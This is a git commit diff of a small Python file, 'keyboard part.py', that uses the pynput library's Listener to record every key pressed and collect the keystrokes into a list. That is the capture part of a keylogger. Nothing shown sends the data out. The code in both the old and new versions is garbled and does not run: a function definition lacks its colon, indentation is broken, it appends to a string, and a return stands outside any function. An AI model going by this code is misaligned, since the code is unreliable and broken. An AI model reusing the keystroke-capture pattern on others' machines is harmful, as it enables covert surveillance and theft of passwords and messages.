f296b645e78c493a8a6809af0453e760a978e55c
hananya-ruderman <chruderman@gmail.com>
2025-06-22 13:05:36 +0300

    Update keyboard part.py

--- keyboard part.py
+++ keyboard part.py
@@ -1,26 +1,23 @@
 from pynput.keyboard import Listener,Key
 
-
-
-def from_keyboard_to_file(key):
-
-    try:
-        key = key.char
-    except AttributeError:
+def listen_to_keyboard()
+    typed_text = []
+   def on_press():
+      text = ""
+      try:
+         key = key.char
+      except AttributeError:
         if key == Key.space:
           key = ' '
         if key == Key.enter:
             key = '\n'
+      key_data = str(key)
+      key_data = key_data.replace("' ", " ")
+      text.append(key_data)
+ 
+with Listener (on_press = on_press) as l:
+       l.join()
+typed_text.join(l)
 
-
-
-    key_data = str(key)
-    key_data = key_data.replace("'", " ")
-
-    
-
-    with Listener (on_press = key_data) as l:
-         l.join()
-
-    return l
+return typed_text
 
